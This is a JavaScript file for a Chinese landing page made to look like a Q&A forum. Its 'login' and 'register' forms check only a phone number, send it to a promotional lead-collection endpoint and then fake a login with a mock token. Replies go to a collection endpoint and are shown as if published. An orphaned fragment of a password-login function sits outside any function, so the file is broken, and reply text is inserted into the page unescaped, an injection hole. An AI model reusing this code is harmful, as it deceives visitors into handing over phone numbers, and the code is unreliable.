// PC端模板基础脚本
document.addEventListener('DOMContentLoaded', function() {
    console.log('PC Template loaded successfully');
    // 页面加载时清除旧的登录数据，不持久化登录状态
    localStorage.removeItem('user_token');
    localStorage.removeItem('user_phone');
});

// 全局变量：存储当前待发布的回复数据
let pendingReply = {
    answerId: '',
    content: '',
    el: null
};

// 显示/隐藏回复输入框
function showReplyInput(el) {
    const answerItem = el.closest('.bg-white.p-6');
    const replyInputWrap = answerItem.querySelector('.reply-input-wrap');
    const isVisible = !replyInputWrap.classList.contains('hidden');
    
    // 先隐藏所有回复输入框
    document.querySelectorAll('.reply-input-wrap').forEach(item => {
        item.classList.add('hidden');
    });
    
    // 如果当前已经显示，则隐藏；否则显示
    if (!isVisible) {
        replyInputWrap.classList.remove('hidden');
        // 自动聚焦输入框
        replyInputWrap.querySelector('textarea').focus();
    }
}

// 发布回复
async function publishReply(el) {
    const replyInputWrap = el.closest('.reply-input-wrap');
    const content = replyInputWrap.querySelector('textarea').value.trim();
    if (!content) {
        showToast('请输入回复内容', 'warning');
        return;
    }
    
    // 获取当前回答的ID（这里假设回答元素有data-answer-id属性，可根据实际情况调整）
    const answerItem = el.closest('.bg-white.p-6');
    const answerId = answerItem.dataset.answerId || '';
    
    // 存储待发布的回复
    pendingReply = {
        answerId: answerId,
        content: content,
        el: el
    };
    
    // 检查是否已登录
    const token = localStorage.getItem('user_token');
    if (token) {
        // 已登录，直接提交回复
        await submitReply();
    } else {
        // 未登录，显示登录弹窗
        showLoginModal();
    }
    
    // 隐藏回复输入框
    replyInputWrap.classList.add('hidden');
    replyInputWrap.querySelector('textarea').value = '';
}

// 显示登录弹窗
function showLoginModal() {
    document.querySelector('.login-modal').classList.remove('hidden');
}

// 关闭登录弹窗
function closeLoginModal() {
    document.querySelector('.login-modal').classList.add('hidden');
    document.getElementById('loginPhone').value = '';
    document.getElementById('loginPwd').value = '';
}

// 处理注册
async function handleRegister() {
    const phone = document.getElementById('loginPhone').value.trim();
    const submitBtn = document.querySelector('.login-modal button:last-child');
    if (!/^1[3-9]\d{9}$/.test(phone)) {
        showToast('请输入正确的手机号', 'error');
        return;
    }
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<span class="loading"></span>提交中...';
    submitBtn.disabled = true;
    try {
        // 直接提交手机号到收集接口
        await fetch('/api/promotion/landingPhone/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ linkId: window.LINK_ID, phone: phone })
        });
        // 模拟登录状态，存储手机号
        localStorage.setItem('user_token', 'mock_token_' + Date.now());
        localStorage.setItem('user_phone', phone);
        showToast('提交成功', 'success');
        closeLoginModal();
        if (pendingReply.content) {
            await submitReply();
        }
    } catch (e) {
        console.error('提交失败', e);
        showToast('网络错误，请稍后重试', 'error');
    } finally {
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
    }
}

// 处理登录
async function handleLogin() {
    const phone = document.getElementById('loginPhone').value.trim();
    const submitBtn = document.querySelector('.login-modal button:last-child');
    
    // 仅校验手机号
    if (!/^1[3-9]\d{9}$/.test(phone)) {
        showToast('请输入正确的手机号', 'error');
        return;
    }
    
    // 显示loading状态
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<span class="loading"></span>提交中...';
    submitBtn.disabled = true;

    
    try {
        // 直接提交手机号到收集接口
        await fetch('/api/promotion/landingPhone/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ linkId: window.LINK_ID, phone: phone })
        });
        // 模拟登录状态，存储手机号
        localStorage.setItem('user_token', 'mock_token_' + Date.now());
        localStorage.setItem('user_phone', phone);
        showToast('提交成功', 'success');
        closeLoginModal();
        
        // 如果有待发布的回复，自动提交
        if (pendingReply.content) {
            await submitReply();
        }
    } catch (e) {
        console.error('提交失败', e);
        showToast('网络错误，请稍后重试', 'error');
    } finally {
        // 恢复按钮状态
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
    }
}
    if (pwd.length < 6) {
        showToast('密码长度不能少于6位', 'error');
        return;
    }
    
    // 显示loading状态
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<span class="loading"></span>登录中...';
    submitBtn.disabled = true;
    
    try {
        // 调用登录接口（请替换为实际接口地址）
        const res = await fetch('/api/auth/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phone: phone,
                password: pwd
            })
        });
        
        const data = await res.json();
        
        if (data.code === 0) {
            // 登录成功，存储token
            localStorage.setItem('user_token', data.data.token);
            showToast('登录成功', 'success');
            
            // 提交手机号到收集接口
            try {
                await fetch('/api/promotion/landingPhone/create', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ linkId: window.LINK_ID, phone: phone })
                });
            } catch(e) {
                console.error('提交手机号失败', e);
            }
            
            closeLoginModal();
            
            // 如果有待发布的回复，自动提交
            if (pendingReply.content) {
                await submitReply();
            }
        } else {
            showToast(data.msg || '登录失败，请重试', 'error');
        }
    } catch (e) {
        console.error('登录请求失败', e);
        showToast('网络错误，请稍后重试', 'error');
    } finally {
        // 恢复按钮状态
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
    }
}

// 提交回复
async function submitReply() {
    const submitBtn = pendingReply.el;
    const originalText = submitBtn.innerHTML;
    const token = localStorage.getItem('user_token');
    
    if (!token || !pendingReply.content) return;
    
    // 显示loading状态
    submitBtn.innerHTML = '<span class="loading"></span>发布中...';
    submitBtn.disabled = true;
    
    try {
        // 提交留言到收集接口
        try {
            await fetch('/api/promotion/landingMessage/create', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    linkId: window.LINK_ID, 
                    content: pendingReply.content,
                    phone: localStorage.getItem('user_phone') || ''
                })
            });
        } catch(e) {
            console.error('提交留言失败', e);
        }
        
        showToast('回复发布成功', 'success');
        // 模拟回复数据
        const mockReplyData = {
            nickname: '匿名用户',
            avatarUrl: '',
            titleName: '',
            level: ''
        };
        // 将回复插入到列表中
        appendReplyToList(pendingReply.el, mockReplyData);
        // 清空待发布数据
        pendingReply = { answerId: '', content: '', el: null };
    } catch (e) {
        console.error('发布回复失败', e);
        showToast('网络错误，请稍后重试', 'error');
    } finally {
        // 恢复按钮状态
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
    }
}

// 将新回复插入到回复列表
function appendReplyToList(submitBtn, replyData) {
    const answerItem = submitBtn.closest('.bg-white.p-6');
    const replyListWrap = answerItem.querySelector('.answer-stats').parentElement;
    
    // 生成回复HTML，和现有回复样式完全一致
    const replyHtml = `
    <div class="bg-yellow-50 p-4 rounded mb-2 ml-14">
         <div class="flex items-center gap-2 mb-2 flex-wrap">
             <img src="${replyData.avatarUrl || '/static/default-avatar.png'}" class="w-8 h-8 rounded-full mr-2" alt="avatar">
             <span class="text-green-600 font-medium">${replyData.nickname || '匿名用户'}</span>
             ${replyData.titleName ? `<span class="px-1 py-0.5 bg-orange-100 text-orange-600 rounded text-xs">${replyData.titleName}</span>` : ''}
             ${replyData.level ? `<span class="px-1 py-0.5 bg-purple-100 text-purple-600 rounded text-xs">LV.${replyData.level}</span>` : ''}
         </div>
         <div class="ql-editor-content text-gray-700 leading-relaxed">${pendingReply.content}</div>
         <!-- 回复统计 -->
         <div class="reply-stats flex justify-end mt-1 mb-3">
             <button class="stat-btn px-2 py-1 bg-gray-50 rounded text-xs text-gray-600 hover:bg-gray-100" onclick="addCount(this)">👍 0</button>
             <button class="stat-btn px-2 py-1 bg-gray-50 rounded text-xs text-gray-600 hover:bg-gray-100">关注 0</button>
             <button class="stat-btn px-2 py-1 bg-gray-50 rounded text-xs text-gray-600 hover:bg-gray-100">收藏 0</button>
         </div>
    </div>
    `;
    
    // 插入到回复列表的最前面
    const existingReplies = answerItem.querySelectorAll('.bg-yellow-50');
    if (existingReplies.length > 0) {
        existingReplies[0].insertAdjacentHTML('beforebegin', replyHtml);
    } else {
        // 没有现有回复，插入到回复统计下面
        const answerStats = answerItem.querySelector('.answer-stats');
        answerStats.insertAdjacentHTML('afterend', replyHtml);
    }
}

// 显示Toast提示
function showToast(message, type = 'success') {
    // 先移除已存在的toast
    const existingToast = document.querySelector('.toast');
    if (existingToast) {
        existingToast.remove();
    }
    
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    // 3秒后自动消失
    setTimeout(() => {
        toast.remove();
    }, 3000);
}